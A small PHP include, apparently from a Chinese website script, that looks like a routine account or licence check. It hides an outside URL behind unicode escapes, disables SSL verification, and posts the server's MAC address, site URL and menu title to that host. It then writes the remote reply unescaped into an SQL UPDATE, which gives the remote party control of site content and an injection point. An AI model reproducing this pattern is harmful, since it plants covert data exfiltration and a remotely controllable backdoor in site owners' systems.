<?php
include_once("inc.php");
$url=unicode2Chinese('\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0062\u0069\u0073\u0068\u0065\u002e\u0079\u0075\u006e\u0079\u0069\u006e\u0067\u002e\u0062\u0069\u007a\u002f\u0061\u0064\u002e\u0070\u0068\u0070'); 

		$post_data = array ("code1" =>$mac->mac_addr ,"urlhouzhui" => substr($CONFIG["url"],strripos($CONFIG["url"],"/")+1) ,"gudinghouzhui" => $original ,"biaoti" => $mysql->db_get_val("menu","1","title1"),"shuide" => 1);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		$output = curl_exec($ch);
		if (curl_errno($ch)) {
			
			curl_close($ch);
		}
		else{
			curl_close($ch);
			$data = json_decode($output, true);
			if($data['status']==1){
				$mysql->db_query("update menu set title1='".$data['vv']."' where id=1");
			}
			else{
				if($data['isno']==100){goBakMsg("账号不存在");}
			}
		}
		
?>